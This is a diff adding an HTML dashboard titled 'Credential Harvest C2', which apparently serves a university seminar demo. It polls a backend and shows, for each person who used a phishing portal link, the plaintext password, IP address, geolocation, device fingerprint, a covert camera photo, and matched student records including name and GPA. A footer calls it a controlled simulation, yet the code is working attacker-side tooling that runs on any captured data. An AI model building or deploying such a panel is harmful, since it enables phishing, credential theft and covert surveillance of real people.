@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 Dashboard — JKUAT Demo</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Courier New',monospace; background:#0a0a0a; color:#00ff41; min-height:100vh; }
+
+  .topbar {
+    background:#111; border-bottom:1px solid #00ff41;
+    padding:12px 24px; display:flex; justify-content:space-between; align-items:center;
+  }
+  .topbar h1 { font-size:15px; }
+  .tag { font-size:11px; color:#ff4444; }
+  .live-dot {
+    display:inline-block; width:8px; height:8px;
+    background:#00ff41; border-radius:50%; margin-right:6px;
+    animation:blink 1s infinite;
+  }
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+
+  .stats-row { display:flex; gap:1px; background:#1a1a1a; border-bottom:1px solid #222; }
+  .stat { flex:1; padding:14px 18px; background:#111; }
+  .stat .num { font-size:28px; color:#00ff41; font-weight:700; }
+  .stat .lbl { font-size:10px; color:#666; margin-top:2px; text-transform:uppercase; }
+
+  .content { padding:20px; }
+
+  .controls { display:flex; gap:10px; margin-bottom:16px; flex-wrap:wrap; align-items:center; }
+  button {
+    padding:7px 14px; border:1px solid #333; background:#111;
+    color:#00ff41; font-family:monospace; font-size:12px;
+    cursor:pointer; border-radius:4px;
+  }
+  button:hover { background:#1a1a1a; border-color:#00ff41; }
+  .dbtn { color:#ff4444; }
+
+  /* Cards grid */
+  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(320px,1fr)); gap:14px; }
+
+  .capture-card {
+    background:#111; border:1px solid #1a1a1a;
+    border-radius:8px; overflow:hidden;
+    transition:border-color 0.2s;
+  }
+  .capture-card:hover { border-color:#00ff41; }
+  .capture-card.new { border-color:#00ff41; animation:flash 1s ease; }
+  @keyframes flash{0%{box-shadow:0 0 20px #00ff41}100%{box-shadow:none}}
+
+  .card-header {
+    background:#0d0d0d; padding:10px 14px;
+    display:flex; justify-content:space-between; align-items:center;
+    border-bottom:1px solid #1a1a1a;
+  }
+  .card-header .id   { color:#00ff41; font-size:13px; font-weight:700; }
+  .card-header .time { color:#444; font-size:11px; }
+
+  .card-body { padding:12px 14px; display:grid; grid-template-columns:100px 1fr; gap:12px; }
+
+  /* photo column */
+  .photo-col { display:flex; flex-direction:column; gap:6px; }
+  .cam-photo {
+    width:100px; height:75px; object-fit:cover;
+    border-radius:4px; border:1px solid #ef4444;
+  }
+  .no-cam {
+    width:100px; height:75px; background:#0d0d0d;
+    border:1px dashed #333; border-radius:4px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:10px; color:#333; text-align:center;
+  }
+
+  /* info column */
+  .info-col { font-size:12px; }
+  .kv { display:flex; gap:6px; margin-bottom:4px; }
+  .k  { color:#555; width:80px; flex-shrink:0; }
+  .v  { color:#ccc; word-break:break-all; }
+  .v.danger { color:#ef4444; }
+  .v.warn   { color:#f59e0b; }
+  .v.green  { color:#00ff41; }
+  .v.blue   { color:#60a5fa; }
+
+  .pw-reveal {
+    font-family:monospace; color:#ef4444; font-size:13px;
+    letter-spacing:1px; background:#0d0d0d;
+    padding:4px 8px; border-radius:3px;
+    border:1px dashed #7f1d1d; display:inline-block;
+    margin-top:2px; word-break:break-all;
+  }
+
+  .empty {
+    text-align:center; padding:60px 20px;
+    color:#333; font-size:13px;
+  }
+  .empty .big { font-size:36px; margin-bottom:10px; }
+
+  .footer-note {
+    margin-top:28px; padding:14px 18px;
+    background:#0f2741; border:1px solid #1d4ed8;
+    border-radius:6px; font-family:'Segoe UI',sans-serif;
+    font-size:12px; color:#93c5fd; text-align:center;
+  }
+
+  #status { color:#444; font-size:11px; margin-left:8px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div><span class="live-dot"></span>
+    <h1 style="display:inline">CREDENTIAL HARVEST C2 — JKUAT DEMO</h1>
+  </div>
+  <span class="tag">&#9888; EDUCATIONAL SIMULATION — CS SEMINAR 2025</span>
+</div>
+
+<div class="stats-row">
+  <div class="stat"><div class="num" id="sc-total">0</div><div class="lbl">Total Captures</div></div>
+  <div class="stat"><div class="num" id="sc-cam">0</div><div class="lbl">Camera Photos</div></div>
+  <div class="stat"><div class="num" id="sc-geo">0</div><div class="lbl">Geolocated</div></div>
+  <div class="stat"><div class="num" id="sc-match">0</div><div class="lbl">Creds Matched</div></div>
+</div>
+
+<div class="content">
+  <div class="controls">
+    <button onclick="fetchData()">&#8635; Refresh</button>
+    <button onclick="toggleAuto()" id="auto-btn">&#9654; Auto (5s)</button>
+    <button class="dbtn" onclick="clearAll()">&#128465; Clear</button>
+    <span id="status">Ready.</span>
+  </div>
+
+  <div class="grid" id="grid">
+    <div class="empty"><div class="big">&#9654;</div>Send the portal link — captures appear here live.</div>
+  </div>
+
+  <div class="footer-note">
+    &#127891; Controlled demo for JKUAT ICT Seminar — Digital Infrastructure as a War Target.<br>
+    All data is synthetic or voluntarily submitted by briefed participants. Nothing is persisted beyond this session.
+  </div>
+</div>
+
+<script>
+let autoTimer = null;
+let knownIds  = new Set();
+
+function fetchData() {
+  fetch('/api/captures').then(r=>r.json()).then(data => {
+    renderGrid(data);
+    updateStats(data);
+    document.getElementById('status').textContent =
+      'Updated: ' + new Date().toLocaleTimeString();
+  }).catch(()=> document.getElementById('status').textContent = 'Error.');
+}
+
+function updateStats(data) {
+  document.getElementById('sc-total').textContent = data.length;
+  document.getElementById('sc-cam').textContent   = data.filter(d=>d.photo).length;
+  document.getElementById('sc-geo').textContent   = data.filter(d=>d.geo && d.geo.city).length;
+  document.getElementById('sc-match').textContent = data.filter(d=>d.found).length;
+}
+
+function renderGrid(data) {
+  const grid = document.getElementById('grid');
+  if (!data.length) {
+    grid.innerHTML = '<div class="empty"><div class="big">&#9654;</div>No captures yet.</div>';
+    knownIds.clear(); return;
+  }
+
+  grid.innerHTML = [...data].reverse().map(e => {
+    const isNew = !knownIds.has(e.id);
+    const g  = e.geo || {};
+    const fp = e.fingerprint || {};
+
+    const photoHTML = e.photo
+      ? `<img class="cam-photo" src="${e.photo}" alt="capture">`
+      : `<div class="no-cam">No camera</div>`;
+
+    return `
+    <div class="capture-card ${isNew ? 'new' : ''}" id="card-${e.id}">
+      <div class="card-header">
+        <span class="id">#${e.id} — ${e.reg_no || 'unknown'}</span>
+        <span class="time">${e.timestamp}</span>
+      </div>
+      <div class="card-body">
+        <div class="photo-col">
+          ${photoHTML}
+          <div style="font-size:10px;color:${e.photo?'#ef4444':'#333'};text-align:center">
+            ${e.photo ? '📷 captured' : '🚫 denied'}
+          </div>
+        </div>
+        <div class="info-col">
+          <div class="kv"><span class="k">Password</span></div>
+          <div class="pw-reveal">${e.password || '—'}</div>
+
+          <div style="margin-top:8px"></div>
+          <div class="kv"><span class="k">IP</span>     <span class="v danger">${e.ip}</span></div>
+          <div class="kv"><span class="k">City</span>   <span class="v warn">${g.city||'—'}, ${g.region||''}</span></div>
+          <div class="kv"><span class="k">ISP</span>    <span class="v blue">${(g.isp||'—').slice(0,28)}</span></div>
+          <div class="kv"><span class="k">Device</span> <span class="v">${e.device} / ${e.browser}</span></div>
+          <div class="kv"><span class="k">Screen</span> <span class="v">${fp.screen||'—'}</span></div>
+          <div class="kv"><span class="k">TZ</span>     <span class="v">${fp.timezone||'—'}</span></div>
+          <div class="kv"><span class="k">Unique</span> <span class="v ${fp.uniqueness>85?'danger':'warn'}">${fp.uniqueness||'—'}%</span></div>
+          ${e.found && e.student ? `
+            <div style="margin-top:8px;padding-top:8px;border-top:1px solid #1a1a1a">
+              <div class="kv"><span class="k">Name</span>   <span class="v green">${e.student.name}</span></div>
+              <div class="kv"><span class="k">Course</span> <span class="v" style="color:#a78bfa">${e.student.course}</span></div>
+              <div class="kv"><span class="k">Year</span>   <span class="v">Year ${e.student.year}</span></div>
+              <div class="kv"><span class="k">GPA</span>    <span class="v warn">${e.student.gpa}</span></div>
+            </div>` : '<div class="kv" style="margin-top:6px"><span class="k" style="color:#333">No match</span></div>'}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+
+  data.forEach(e => knownIds.add(e.id));
+}
+
+function toggleAuto() {
+  if (autoTimer) {
+    clearInterval(autoTimer); autoTimer = null;
+    document.getElementById('auto-btn').textContent = '▶ Auto (5s)';
+  } else {
+    autoTimer = setInterval(fetchData, 5000);
+    document.getElementById('auto-btn').textContent = '⏸ Stop auto';
+    fetchData();
+  }
+}
+
+function clearAll() {
+  if (!confirm('Clear all?')) return;
+  fetch('/api/reset',{method:'POST'}).then(()=>{ knownIds.clear(); fetchData(); });
+}
+
+fetchData();
+</script>
+</body>
+</html>
